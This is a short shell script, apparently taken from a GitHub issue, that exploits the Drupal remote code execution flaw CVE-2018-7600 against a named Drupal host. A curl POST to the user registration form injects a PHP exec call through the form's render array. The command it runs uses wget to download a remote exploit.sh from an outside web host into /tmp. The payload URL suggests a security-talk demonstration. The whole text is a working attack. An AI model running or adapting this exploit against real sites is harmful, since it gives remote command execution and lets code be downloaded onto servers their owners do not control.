#!/bin/sh
# from https://github.com/a2u/CVE-2018-7600/issues/2

HOST="https://drupal-845.local.tokaido.io:5154"
PHP_FUNCTION="exec"
PHP_ARG="wget https://www.richo.com.au/drupal-south/how-not-to-get-hacked/exploit.sh -O /tmp/exploit.sh"

curl -X POST \
  "$HOST/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  -F form_id=user_register_form \
  -F _drupal_ajax=1 \
  -F "mail[#post_render][]=$PHP_FUNCTION" \
  -F 'mail[#type]=markup' \
  -F "mail[#markup]=$PHP_ARG"